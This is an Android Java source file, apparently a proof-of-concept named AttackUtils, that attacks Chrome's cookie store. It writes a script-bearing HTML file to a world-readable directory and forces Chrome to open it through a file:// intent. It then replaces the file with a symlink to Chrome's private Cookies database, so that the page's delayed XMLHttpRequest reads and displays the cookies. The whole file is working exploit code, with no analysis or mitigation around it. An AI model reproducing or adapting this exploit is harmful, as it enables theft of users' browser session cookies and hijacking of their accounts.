package com.willing.jsdemo;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

public class AttackUtils {
    public final static String MY_PKG = "com.didi.jsdemo";
    public final static String MY_TMP_DIR = "/data/data/" + MY_PKG + "/tmp/";
    public final static String HTML_PATH = MY_TMP_DIR + "malicious.html";
    public final static String TARGET_PKG = "com.android.chrome";
    public final static String TARGET_FILE_PATH = "/data/data/" + TARGET_PKG + "/app_chrome/Default/Cookies";
    public final static String HTML =
            "<body>\n" +
                    "<u>Wait a few seconds.</u>\n" +
                    "<script>\n" +
                    "    var doc = document;\n" +
                    "    function readFile() {\n" +
                    "        var xmlHttp = new XMLHttpRequest();\n" +
                    "        xmlHttp.onload = function() {\n" +
                    "            var res = xmlHttp.responseText;\n" +
                    "            alert(res);\n" +
                    "            doc.body.appendChild(doc.createTextNode(res));\n" +
                    "        }\n" +
                    "        xmlHttp.open(\"GET\", doc.URL, true);\n" +
                    "        xmlHttp.send();\n" +
                    "\n" +
                    "    }\n" +
                    "    setTimeout(readFile, 8000);\n" +
                    "</script>\n" +
                    "</body>";

    public void attack(Context context) {
        try {
            // Create a malicious HTML
            exec("mkdir " + MY_TMP_DIR);
            exec("echo \"" + HTML + "\" > " + HTML_PATH);
            exec("chmod -R 777 " + MY_TMP_DIR);
            Thread.sleep(1000);

            // Force Chrome to load the malicious HTML
            invokeChrome(context, "file://" + HTML_PATH);
            Thread.sleep(4000);

            // Replace the HTML with a symlink to Chrome's Cookie file
            exec("rm " + HTML_PATH);
            exec("ln -s " + TARGET_FILE_PATH + " " + HTML_PATH);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void exec(String cmd) {
        try {
            String[] tmp = new String[]{"/system/bin/sh", "-c", cmd};
            Runtime.getRuntime().exec(tmp);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void invokeChrome(Context context, String url) {
        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        intent.setClassName(TARGET_PKG, TARGET_PKG + ".Main");
        context.startActivity(intent);
    }
}
